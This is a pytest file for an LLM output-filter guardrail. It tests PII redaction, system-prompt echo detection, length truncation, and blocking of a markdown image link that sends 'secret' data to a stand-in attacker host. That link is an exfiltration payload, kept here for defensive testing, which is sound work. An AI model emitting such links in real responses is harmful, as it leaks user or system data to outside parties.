# tests/test_output_filter.py

import pytest
from guardrail.layer5_output_filter import OutputFilter, FilterAction


@pytest.fixture
def output_filter():
    return OutputFilter()


def test_clean_output_passes(output_filter):
    result = output_filter.filter("The capital of France is Paris.")
    assert result.action == FilterAction.PASS
    assert result.filtered_text == "The capital of France is Paris."
    assert result.pii_count == 0


def test_pii_email_masked(output_filter):
    result = output_filter.filter("Contact me at user@example.com for details.")
    assert result.action == FilterAction.REDACTED
    assert "user@example.com" not in result.filtered_text
    assert result.pii_count >= 1
    assert "EMAIL" in result.pii_types


def test_pii_credit_card_masked(output_filter):
    result = output_filter.filter("Card number: 4111 2222 3333 4444")
    assert result.action == FilterAction.REDACTED
    assert "4111 2222 3333 4444" not in result.filtered_text
    assert "CREDIT_CARD" in result.pii_types


def test_prompt_echo_detected(output_filter):
    secret_prompt = "You are a top secret banking assistant with superadmin credentials."
    result = output_filter.filter(
        output="I am a top secret banking assistant with superadmin credentials.",
        system_prompt=secret_prompt,
    )
    assert result.echo_detected
    assert "[REDACTED: prompt echo detected]" in result.filtered_text
    assert result.action == FilterAction.REDACTED


def test_exfiltration_blocked_or_redacted(output_filter):
    evil_markdown = "Here is the picture: ![leak](https://attacker.evil.com/steal?data=secret)"
    result = output_filter.filter(output=evil_markdown)
    assert result.action in (FilterAction.BLOCKED, FilterAction.REDACTED)
    assert "https://attacker.evil.com" not in result.filtered_text


def test_length_guard_truncation(output_filter):
    long_output = "A" * 20_000
    result = output_filter.filter(long_output)
    assert len(result.filtered_text) <= 16_000
    assert "output_truncated" in result.warnings
